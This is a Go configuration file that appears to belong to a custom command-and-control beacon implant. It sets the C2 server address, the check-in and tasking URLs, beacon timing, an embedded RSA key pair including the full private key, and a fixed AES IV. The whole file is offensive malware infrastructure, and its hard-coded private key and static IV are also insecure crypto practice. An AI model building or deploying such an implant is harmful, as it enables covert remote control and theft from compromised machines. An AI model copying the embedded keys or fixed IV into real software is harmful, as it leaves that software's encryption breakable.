package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC711xhNzyLaTZmhfQlSaNHMFtT/Zo1pspTkunU
QlokHbt42RO69whtoDMvM7TL/6d2kd99Xg/Mv/P61nxO5zqkyr1mX51JIgeGYNXOo/lnUSAMRbYS
xYHNMe2g87x9As5jQvcmhxMkBjqog5LhMSEl443RgrxgIZfnKBA0uSUHMwIDAQAB
-----END PUBLIC KEY-----`)
	RsaPrivateKey = []byte(`-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALvXXGE3PItpNmaF9CVJo0cwW1P9
mjWmylOS6dRCWiQdu3jZE7r3CG2gMy8ztMv/p3aR331eD8y/8/rWfE7nOqTKvWZfnUkiB4Zg1c6j
+WdRIAxFthLFgc0x7aDzvH0CzmNC9yaHEyQGOqiDkuExISXjjdGCvGAhl+coEDS5JQczAgMBAAEC
gYBHXMAp5tRHmociWA2zBNDVQNfRhu1JKL6BFbVkAHlCc1E/ziiixSscitonOpubTNsQPscLV+rk
vKAyUb4UM+ChBplfNsFcZ1Mo/20EuX4zWTxawoM+fNNc76ONC2VP1nAk770qrpsoUycw13YTVPn7
ei5alwbGDrNCu4t6y5sGsQJBAPpAzlBguEb6ZTGdThT0e6LlpNDitLKWGt73cRQfEVX1/0TS1zBT
ffi4qFkId1LNsQ2aYiPP86ynrkUYDVXBvlcCQQDAJ6V8hx5ej9nc4fe95TkWweuXT6/AxPop/k1/
EFGqFwOcZoq60HCVW6DjDRbHjFofHnek06dQ6txhw6FSLXyFAkB8s2hbUybgb4uXYoxzErS9InOz
hxSF3Rh8vI6DeUu5KwDNucZzFVezZci1vOtAvrCYV7LJp6kEAvZrBaY3cni3AkEApF/F4na7dezc
U2VBxkHVyi/s1q0mDWLzFQUjSfStxzCUuC/HsPMpu7p8MH475EudtE0dz/P2hvPBvifZUjDy+QJB
AMLUQ/YE0jUXMkAI4Yo2/GgaMeNC7yNf9cvQL9OJ6lcR4fq4OSyYyB3ReB3OVvZs9EEsX7LuP+eh
GEfFX6ngGhI=	
-----END PRIVATE KEY-----`)

	C2                          = "192.168.83.131:80"
	plainHTTP                   = "http://"
	sslHTTP                     = "https://"
	GetUrl                      = plainHTTP + C2 + "/list/" //这里根据http 或https beacon修改plainHTTP 或sslHTTP
	PostUrl                     = plainHTTP + C2 + "/newmnpuser/"
	WaitTime                    = 1000 * time.Millisecond
	VerifySSLCert               = true
	TimeOut       time.Duration = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
)

const (
	DebugMode = true
)
